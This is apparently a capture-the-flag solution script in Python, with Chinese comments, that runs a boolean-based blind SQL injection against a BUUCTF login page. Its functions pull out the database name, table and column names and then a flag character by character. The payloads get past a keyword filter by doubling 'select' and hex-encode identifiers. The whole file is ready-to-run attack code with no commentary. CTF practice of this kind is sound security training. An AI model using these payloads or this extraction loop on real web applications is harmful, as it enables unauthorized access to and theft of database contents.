# coding:utf-8
import requests
import string
url = 'http://2ce77823-cd02-4bcc-aa25-642639673277.node4.buuoj.cn:81/login.php'
dic = string.digits + string.ascii_letters + "!@#$%^&*()_+{}-="
right = '8bef'  # 判断值
worry = '5728'  # 判断值

def database_namelength():
    # 跑数据库名长度
    for i in range(30):
        # key = "admin%1$' and " + "(length(database())=" + str(i) + ")#"
        key = "admin' and " + "(length(database())=" + str(i) + ")#"  # 构造注入语句
        data = {
            'name': key,
            'pass': '123',
        }
        r = requests.post(url, data=data).text
        # print(r)
        if right in str(r):
            print('the length of database is %s' % i)

def database_name():
    length = 4
    name = ''
    for j in range(1, length + 1):
        for i in range(65, 123):
            # key = "admin%1$' and " + "(substr(database(),0,1)=" + i + ")#"
            # key = "admin%1$' and " + "(substr(database(),"+str(j)+",1)=" + i + ")#"
            key = "admin'" + " and (ascii(substr(database(),%d,1))=%d)#" % (j, i)
            data = {'name': key, 'pass': '111'}
            r = requests.post(url, data=data).text
            if right in str(r):
                name += chr(i)
                print(name)

def table_namelength():
    for i in range(30):
        key = "admin' and " + "length((sselectelect table_name FROM information_schema.tables WHERE table_schema=0x6e6f7465 limit 0,1))=" + str(
            i) + "#"
        data = {'name': key, 'pass': '111'}
        r = requests.post(url, data=data).text
        # print(r)
        if right in str(r):
            print('the length of table is %s' % i)

def table_name():
    length = 4
    name = ''
    for j in range(1, length + 1):
        for i in range(48, 123):
            # key = "admin%1$' and " + "(substr(database(),0,1)=" + i + ")#"
            # key = "admin%1$' and " + "(substr(database(),"+str(j)+",1)=" + i + ")#"
            key = "admin'" + " and (ascii(substr((seselectlect  table_name FROM information_schema.tables WHERE table_schema=0x6e6f7465 limit 0,1),%d,1))=%d)#" % (j, i)
            data = {'name': key, 'pass': '111'}
            r = requests.post(url, data=data).text
            if right in str(r):
                name += chr(i)
                print(name)

def column_namelength():
    for i in range(30):
        key = "admin' and " + "length((seselectlect column_name FROM information_schema.columns WHERE table_name=0x666c3467 limit 0,1))=" + str(
            i) + "#"
        data = {'name': key, 'pass': '111'}
        r = requests.post(url, data=data).text
        # print(r)
        if right in str(r):
            print('the length of column is %s' % i)

def column_name():
    length = 4
    name = ''
    for j in range(1, length + 1):
        for i in range(48, 123):
            # key = "admin%1$' and " + "(substr(database(),0,1)=" + i + ")#"
            # key = "admin%1$' and " + "(substr(database(),"+str(j)+",1)=" + i + ")#"
            key = "admin'" + " and (ascii(substr((seselectlect  column_name FROM information_schema.columns WHERE table_name=0x666c3467 limit 0,1),%d,1))=%d)#" % (j, i)
            data = {'name': key, 'pass': '111'}
            r = requests.post(url, data=data).text
            if right in str(r):
                name += chr(i)
                print(name)

def flaglength():
    for i in range(60):
        key = "admin' and " + "length((seselectlect flag FROM fl4g limit 0,1))=" + str(i) + "#"
        data = {'name': key, 'pass': '111'}
        r = requests.post(url, data=data).text
        # print(r)
        if right in str(r):
            print('the length of flag is %s' % i)

def flag():
    length = 26
    flag = ''
    for j in range(1, length + 1):
        for i in dic:
            # key = "admin%1$' and " + "(substr(database(),0,1)=" + i + ")#"
            # key = "admin%1$' and " + "(substr(database(),"+str(j)+",1)=" + i + ")#"
            key = "admin'" + " and (ascii(substr((sselectelect flag FROM fl4g limit 0,1),%d,1))=" % j + str(ord(i)) + ")#"
            data = {'name': key, 'pass': '111'}
            r = requests.post(url, data=data).text
            if right in str(r):
                flag += i
                print(flag)

flag()







